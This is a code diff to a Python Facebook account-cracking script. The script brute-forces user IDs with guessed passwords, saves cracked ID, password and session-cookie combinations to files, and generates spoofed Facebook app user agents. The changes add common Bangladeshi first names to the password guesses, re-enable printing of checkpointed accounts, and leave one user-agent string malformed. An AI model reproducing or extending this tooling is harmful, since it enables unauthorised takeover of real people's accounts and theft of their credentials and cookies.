@@ -105,7 +105,7 @@ def clear():
 	os.system('clear')
 	print(logo)
 def linex():
-	print('\033[1;97m--------------------------------------------------')
+	print('\033[1;97m-----------------------------------------------')
 #<----[main_menu]------>
 def menu():
 	clear()
@@ -269,7 +269,7 @@ class main_crack():
                     open('/sdcard/SHANTO-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/SHANTO_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     ##print(f'\r\r\x1b[1;91m [SHANTO-CP] {rid} | {ps}\033[1;97m')
+                     print(f'\r\r\x1b[1;91m [SHANTO-CP] {rid} | {ps}\033[1;97m')
                      cps.append(rid)
                      open('/sdcard/SHANTO-CP.txt','a').write(rid+'|'+ps+'\n')
                 else:
@@ -1613,13 +1613,7 @@ for xd in range(10000):
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
 awan =[
-'Davik/2.1.0 (Linux; U; Android 10; SM-N970U Build/QP1A.) [FBAN/MessengerLite;FBAV/310.0.0.4.103;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/450821329;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-N970U;FBSV/8.0.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=2048,width=4096};]'
-'Davik/2.1.0 (Linux; U; Android 10; SM-N970U Build/QP1A.) [FBAN/MessengerLite;FBAV/310.0.0.4.103;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/450821329;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-N970U;FBSV/8.0.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=2048,width=4096};]'
-'Davik/2.1.0 (Linux; U; Android 10; SM-N970U Build/QP1A.) [FBAN/MessengerLite;FBAV/313.0.0.5.95;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/450821329;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-N970U;FBSV/8.0.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=2048,width=4096};]'
-'Davik/2.1.0 (Linux; U; Android 10; SM-N970U Build/QP1A.) [FBAN/MessengerLite;FBAV/310.0.0.4.103;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/450821329;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-N970U;FBSV/8.0.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=2048,width=4096};]'
-'Davik/2.1.0 (Linux; U; Android 10; SM-N970U Build/QP1A.) [FBAN/MessengerLite;FBAV/310.0.0.4.103;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/450821329;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-N970U;FBSV/8.0.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=2048,width=4096};]'
-'Davik/2.1.0 (Linux; U; Android 8.0.0; SM-G955U Build/R16NW) [FBAN/MessengerLite;FBAV/302.0.0.3.76;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/267460405;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-G955U;FBSV/8.0.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=2048,width=4096};]'
-'Davik/2.1.0 (Linux; U; Android 8.0.0; SM-G955U Build/R16NW) [FBAN/MessengerLite;FBAV/313.0.0.5.95;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/582185999;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-G955U;FBSV/8.0.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=2048,width=4096};]']
+'Dalvik/2.1.0 (Linux; U; Android{random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/72.0.0.2133;FBBV/6966247;[FBAN/FB4A;FBAV/318.0.0.24.109;FBBV/377639763;FBDM/{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]
 loop = 0
 oks = []
 cps = []
@@ -1848,7 +1842,7 @@ def bd2():
 		linex()
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,kode,'free fire','bangladish','freefire']
+			pwx = [guru,kode,'sadiya','nusrat','fatema','hridoy','shahin','mababa','alamin','free fire','bangladesh','freefire']
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
